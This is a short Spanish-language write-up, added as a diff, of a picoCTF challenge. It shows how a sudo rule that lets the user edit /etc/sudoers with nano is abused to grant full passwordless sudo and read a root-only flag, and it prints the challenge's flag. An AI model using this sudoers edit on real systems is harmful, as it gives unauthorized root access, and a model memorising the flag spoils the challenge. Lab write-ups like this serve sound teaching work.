@@ -1,0 +1,31 @@
+nos conectamos al server y vemos que onda el desafio dice nano asi q obvio es algo con nano
+estamos en una terminal asi que hacemos sudo -l
+asi vemos nuestros permisos
+
+(ALL) NOPASSWD: /bin/nano /etc/sudoers
+
+ESTO NOS DA UNA FUERTE PISTA AHORA VEREMOS ADELANTE PERO PRIMERO HAGAMOS OTRA COSA
+
+luego ejecutamos
+ctf-player@challenge:~$ ls -l
+total 4
+-r--r----- 1 root root 35 Feb  4  2026 flag.txt
+
+okey solo root tiene acceso y claramente no podemos usar cat como root
+
+AHORA SI pipol realmente la fuerte pista es que /bin/nano /etc/sudoers son los permisos que tenemos practicamente para ejecutar como root
+asi que hacemos
+
+sudo /bin/nano /etc/sudoers
+
+ahi vemos nuestros permisos en ctf player asi que nos pasamos de vivos y reemplazamos esa linea por
+
+ctf-player ALL=(ALL) NOPASSWD: ALL
+
+asi tenemos permiso a ejecutar todos los comandos sin password 
+
+asi que hacemos 
+
+sudo cat flag.txt
+
+picoCTF{n4n0_411_7h3_w4y_f559c068}
